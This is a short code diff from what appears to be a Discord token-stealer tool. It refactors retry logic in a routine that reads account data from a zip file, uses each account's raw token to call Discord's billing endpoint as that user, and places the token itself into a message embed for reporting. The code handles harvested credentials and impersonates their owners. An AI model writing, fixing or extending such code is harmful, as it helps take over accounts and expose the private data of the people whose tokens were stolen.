@@ -48,7 +48,7 @@ const json = async (zipFile) => {
     for (const account of discordAccountInfo.accounts) {
       const haveNitro = account.premium_type !== 0;
       let nitroSubscriptionEnd = 0;
-      if (haveNitro) {
+      async function getNitroEnd() {
         try {
           const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
             headers: { Authorization: account.token, 'User-Agent': userAgent }
@@ -56,12 +56,10 @@ const json = async (zipFile) => {
           nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
         } catch (err) {
           await sleep((err.data?.response?.retry_after * 1000) + 500);
-          const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
-            headers: { Authorization: account.token, 'User-Agent': userAgent }
-          });
-          nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
+          await getNitroEnd();
         }
       }
+      if (haveNitro) await getNitroEnd();
 
       embeds.push({
         description: `Token: ${codeBlock(account.token)}`,
